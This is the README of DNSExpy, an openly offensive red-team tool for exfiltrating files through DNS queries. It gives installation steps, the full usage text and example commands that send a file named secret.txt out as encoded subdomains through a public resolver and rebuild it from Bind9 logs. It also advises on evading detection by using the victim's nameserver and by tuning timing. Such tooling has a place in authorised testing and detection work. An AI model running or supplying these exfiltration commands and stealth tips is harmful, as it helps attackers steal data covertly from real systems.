[![License](https://img.shields.io/badge/license-MIT-green)](https://opensource.org/licenses/MIT) ![Stable Release](https://img.shields.io/badge/stable_release-1.0.0-blue.svg)

![logo](https://raw.githubusercontent.com/dgonzalez55/dnsExpy/main/logo.png "DNSExpy Logo")

Disclaimer: **FOR EDUCATIONAL PURPOSE ONLY! The contributors do not assume any responsibility for the use of this tool.**

# DNSExpy - A DNS Data Exfiltration Tool 🧑‍💻
Developed by David González [dgonzalez55](https://github.com/dgonzalez55/)

Latest Release: v1.0.0. December 27, 2022

License: MIT

This product is subject to the terms detailed in the license agreement.

If you have any questions, comments or concerns regarding DNSExpy, please consult the documentation prior to contacting one of the developers. Your feedback is always welcome. 

##  Contents 🧰

* About DNSExpy
* Installation
* Example Usage
* Usage 

## About DNSExpy ℹ

DNSExpy is a red team tool that could be used to exfiltrate files through DNS protocol by encoding its data and sending them as "random" subdomains of a target domain. If you control the nameserver of the target domain, then you will be able to recover the exfiltrated data even if you are sending the DNS queries to the current nameserver of the victim machine. In fact, you could choose to send exfiltrated data directly to your own nameserver and use a true domain out of your control like github.com. The problem with this approach is that it will be easily detected because of the different nameserver used. 
About recovering exfiltrated data, DNSExpy could do the whole process automatically if the name server of the attacker used is Bind9 and a query log file is provided to the tool. Finally, the exfiltration process could be done in a stealthy way by adjusting time frame and amount of requests per data chunk.

### Features
* Data exfiltration through DNS queries
* Data exfiltration recovering from Bind9 query log files
* Data compression
* Base64 encoding
* Customization of time frame and number of retries
* Custom domains
* Custom dns server
* Error control.

## Installation ⚙️

1. Fork/Clone/Download this repo

    `git clone https://github.com/dgonzalez55/dnsExpy.git`

2. Navigate to the directory

    `cd dnsExpy`

3. Create a virtual environment for this project

    `python -m venv venv`

4. Load the virtual environment
   - On Windows Powershell: `.\venv\Scripts\activate.ps1`
   - On Linux and Git Bash: `source venv/bin/activate`
  
5. Run `pip install -r requirements.txt`

6. Run the dnsExpy.py script

    `python dnsExpy.py <target_options>`

## Example Usage ✌

Exfiltrating secret.txt file using fpdeinformatica.es domain to encode data and through DNS queries sent to 1.1.1.1 (cloudflare). 

```
$ python .\DNSExPy.py -f .\secret.txt -d fpdeinformatica.es -D 1.1.1.1 -m send -v 

```

Recovering data from query.log file encoded as random github.com subdomains and saving exfiltrated file as exfiltrated.txt

```
$ python .\DNSExPy.py -f .\query.log -d github.com -m recover ---output exfiltrated.txt -v 

```

## Usage 🛠
```
______ _   _  _____ _____
|  _  \ \ | |/  ___|  ___|
| | | |  \| |\ `--.| |____  ___ __  _   _   _ __  _   _
| | | | . ` | `--. \  __\ \/ / '_ \| | | | | '_ \| | | |
| |/ /| |\  |/\__/ / |___>  <| |_) | |_| |_| |_) | |_| |
|___/ \_| \_/\____/\____/_/\_\ .__/ \__, (_) .__/ \__, |
                             | |     __/ | | |     __/ |
                             |_|    |___/  |_|    |___/

DNS Exfiltration Spy
Author: @dgonzalez55 a.k.a. MaeseLeGon
Github: https://github.com/dgonzalez55/dnsExpy
Version: 1.0.0

usage: DNSExPy.py [-h] -f FILENAME -d DOMAIN -m {send,recover} [-D DNS] [-p DNSPORT] [-o OUTPUTFILE] [-r REQUESTS] [-t DELAY] [-v] [-z]

DNSExpy.py - DNS Exfiltration Spy

Basic Options:
  -h, --help            show this help message and exit
  -f FILENAME, --file FILENAME
                        Target file to exfiltrate or recover (default: None)
  -d DOMAIN, --domain DOMAIN
                        Domain used in data exfiltration (default: None)
  -m {send,recover}, --mode {send,recover}
                        Mode to be used (send or recover) (default: None)
  -D DNS, --dns DNS     DNS server to query (default: localhost)
  -p DNSPORT, --port DNSPORT
                        DNS port to be used (default: 53)
  -o OUTPUTFILE, --output OUTPUTFILE
                        Output file to save recovered data (only used when recovering data) (default: recovered)

Advanced Options:
  These options are advanced and may not be needed for most users.

  -r REQUESTS, --requests REQUESTS
                        Number of requests to send for each data chunk (default: 2)
  -t DELAY, --time-frame DELAY
                        Number of seconds to wait bewteen each data chunk sent (default: 1)
  -v, --verbose         Verbose output (default: False)
  -z, --zip             If zip compress is required by the exfiltration process (default: False)

```
